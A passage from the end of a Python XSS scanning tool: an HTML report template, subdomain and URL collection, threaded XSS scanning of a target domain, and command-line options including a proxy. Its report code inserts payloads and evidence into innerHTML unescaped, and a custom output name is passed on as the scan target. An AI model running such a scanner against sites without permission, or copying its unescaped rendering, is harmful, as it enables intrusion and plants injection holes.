            `;
            
            if (Object.keys(stats.vulnTypes).length > 0) {{
                html += `<h3>Vulnerability Breakdown</h3><ul>`;
                for (const [type, count] of Object.entries(stats.vulnTypes)) {{
                    html += `<li>${{type}}: ${{count}}</li>`;
                }}
                html += `</ul>`;
            }}
            
            summaryDiv.innerHTML = html;
        }}
        
        // Render vulnerabilities
        function renderVulnerabilities() {{
            const container = document.getElementById('vulnerabilities-container');
            let html = '';
            
            scanData.forEach(result => {{
                if (result.vulnerabilities && result.vulnerabilities.length > 0) {{
                    html += `<h3>URL: ${{result.url}}</h3>`;
                    
                    result.vulnerabilities.forEach(vuln => {{
                        const confidenceClass = vuln.confidence ? vuln.confidence.toLowerCase() : 'medium';
                        html += `
                            <div class="vulnerability ${{confidenceClass}}">
                                <h4>${{vuln.type}} <small>(Confidence: ${{vuln.confidence || 'medium'}})</small></h4>
                                <p><strong>Scanner:</strong> ${{vuln.scanner || 'Unknown'}}</p>
                                ${{vuln.param ? `<p><strong>Parameter:</strong> ${{vuln.param}}</p>` : ''}}
                                <p><strong>Evidence:</strong> ${{vuln.evidence}}</p>
                                <p><strong>Payload:</strong> <code>${{vuln.payload || 'N/A'}}</code></p>
                                ${{vuln.reproduction ? `<p><strong>Reproduction:</strong> <a href="${{vuln.reproduction}}" target="_blank">${{vuln.reproduction}}</a></p>` : ''}}
                                ${{vuln.context ? `<p><strong>Context:</strong> ${{vuln.context}}</p>` : ''}}
                            </div>
                        `;
                    }});
                }}
            }});
            
            container.innerHTML = html || '<p>No vulnerabilities found.</p>';
        }}
        
        // Render payloads
        function renderPayloads() {{
            const container = document.getElementById('payloads-container');
            const payloads = new Set();
            
            scanData.forEach(result => {{
                if (result.payloads_used) {{
                    result.payloads_used.forEach(payload => payloads.add(payload));
                }}
            }});
            
            let html = '<ul>';
            payloads.forEach(payload => {{
                html += `<li><code>${{payload}}</code></li>`;
            }});
            html += '</ul>';
            
            container.innerHTML = html || '<p>No payloads used.</p>';
        }}
        
        // Render statistics
        function renderStats() {{
            const container = document.getElementById('stats-container');
            const stats = calculateStats();
            
            let html = `
                <h3>Scan Metrics</h3>
                <table>
                    <tr><th>Metric</th><th>Value</th></tr>
                    <tr><td>URLs Scanned</td><td>${{stats.totalUrls}}</td></tr>
                    <tr><td>Vulnerable URLs</td><td>${{stats.vulnerableUrls}}</td></tr>
                    <tr><td>Total Vulnerabilities</td><td>${{stats.totalVulns}}</td></tr>
                    <tr><td>Unique Payloads</td><td>${{stats.uniquePayloads}}</td></tr>
                    <tr><td>WAF Detected</td><td>${{stats.wafDetected ? 'Yes' : 'No'}}</td></tr>
                    <tr><td>CSP Detected</td><td>${{stats.cspDetected ? 'Yes' : 'No'}}</td></tr>
                </table>
            `;
            
            if (Object.keys(stats.vulnTypes).length > 0) {{
                html += `<h3>Vulnerability Types</h3><table><tr><th>Type</th><th>Count</th></tr>`;
                for (const [type, count] of Object.entries(stats.vulnTypes)) {{
                    html += `<tr><td>${{type}}</td><td>${{count}}</td></tr>`;
                }}
                html += `</table>`;
            }}
            
            container.innerHTML = html;
        }}
        
        // Tab functionality
        function openTab(evt, tabName) {{
            const tabcontent = document.getElementsByClassName("tabcontent");
            for (let i = 0; i < tabcontent.length; i++) {{
                tabcontent[i].style.display = "none";
            }}
            
            const tablinks = document.getElementsByClassName("tablinks");
            for (let i = 0; i < tablinks.length; i++) {{
                tablinks[i].className = tablinks[i].className.replace(" active", "");
            }}
            
            document.getElementById(tabName).style.display = "block";
            evt.currentTarget.className += " active";
        }}
        
        // Initialize the report
        document.addEventListener('DOMContentLoaded', () => {{
            renderSummary();
            renderVulnerabilities();
            renderPayloads();
            renderStats();
        }});
    </script>
</body>
</html>
    """
    
    with open(output_file, 'w') as f:
        f.write(template)

def scan_domain(domain, full_scan=False):
    """Main Scanning Logic with Enhanced Features"""
    Logger.info(f"Starting scan for {domain}")
    
    if not os.path.exists(domain):
        os.makedirs(domain)
    create_directory_structure(domain)
    
    # Subdomain enumeration
    subdomains = []
    if full_scan:
        try:
            subdomains = enumerate_subdomains(domain)
            if not subdomains:
                Logger.warning("No ACTIVE subdomains found, using main domain")
                subdomains = [domain]
            
            with open(f"{domain}/subdomains/active_subdomains.txt", 'w') as f:
                f.write('\n'.join(subdomains))
        except Exception as e:
            Logger.error(f"Subdomain enumeration failed: {str(e)}")
            subdomains = [domain]
    else:
        subdomains = [domain]
    
    # URL collection
    all_urls = set()
    for sub in subdomains:
        try:
            urls = collect_urls(sub)
            all_urls.update(urls)
            
            sub_name = sub.replace('https://', '').replace('http://', '').replace('/', '_')
            with open(f"{domain}/urls/urls_{sub_name}.txt", 'w') as f:
                f.write('\n'.join(urls))
        except Exception as e:
            Logger.error(f"Failed to collect URLs for {sub}: {str(e)}")
    
    with open(f"{domain}/urls/all_collected_urls.txt", 'w') as f:
        f.write('\n'.join(all_urls))
    
    Logger.info(f"Starting XSS scanning on {len(all_urls)} URLs...")
    results = []
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=Config.MAX_THREADS) as executor:
        future_to_url = {executor.submit(scan_xss, url): url for url in all_urls}
        
        for future in concurrent.futures.as_completed(future_to_url):
            url = future_to_url[future]
            try:
                result = future.result()
                results.append(result)
                
                if result.get('vulnerabilities'):
                    for vuln in result['vulnerabilities']:
                        if vuln.get('confidence') == 'high':
                            Logger.success(f"Found HIGH confidence {vuln['type']} at {url}")
                        else:
                            Logger.info(f"Found {vuln['type']} at {url}")
            except Exception as e:
                Logger.error(f"Error scanning {url}: {str(e)}")
                results.append({
                    'url': url,
                    'error': str(e),
                    'vulnerabilities': []
                })
    
    generate_report(results, domain)
    Logger.success("Scan completed successfully!")

def signal_handler(sig, frame):
    Logger.warning("\nReceived interrupt signal. Shutting down gracefully...")
    sys.exit(0)

def main():
    signal.signal(signal.SIGINT, signal_handler)
    
    print(f"""{colors.BOLD}{colors.PURPLE}
   ███████╗██╗  ██╗███████╗    ███████╗ ██████╗ █████╗ ███╗   ██╗███╗   ██╗███████╗██████╗ 
   ╚══███╔╝╚██╗██╔╝██╔════╝    ██╔════╝██╔════╝██╔══██╗████╗  ██║████╗  ██║██╔════╝██╔══██╗
     ███╔╝  ╚███╔╝ ███████╗    ███████╗██║     ███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██████╔╝
    ███╔╝   ██╔██╗ ╚════██║    ╚════██║██║     ██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██╔══██╗
   ███████╗██╔╝ ██╗███████║    ███████║╚██████╗██║  ██║██║ ╚████║██║ ╚████║███████╗██║  ██║
   ╚══════╝╚═╝  ╚═╝╚══════╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
   
   {colors.CYAN}Ultimate XSS Scanner Pro v8.0 (AI-Optimized with Advanced Detection)
   {colors.YELLOW}By Pradeep Kumar | Enhanced by AI | Educational Use Only
   {colors.RESET}""")
    
    parser = argparse.ArgumentParser(description="AI-Powered XSS Scanner")
    parser.add_argument("domain", help="Target domain to scan")
    parser.add_argument("--full", action="store_true", help="Perform full scan (subdomains + deep scanning)")
    parser.add_argument("--proxy", help="Proxy to use (e.g., http://127.0.0.1:8080)")
    parser.add_argument("--threads", type=int, default=10, help="Maximum threads to use (default: 10)")
    parser.add_argument("--output", help="Custom output directory name")
    args = parser.parse_args()
    
    Config.MAX_THREADS = args.threads
    if args.proxy:
        Config.PROXY = {
            'http': args.proxy,
            'https': args.proxy
        }
        Logger.info(f"Using proxy: {args.proxy}")
    
    output_dir = args.output if args.output else args.domain
    check_and_install_tools()
    scan_domain(output_dir, full_scan=args.full)

if __name__ == "__main__":
    main()
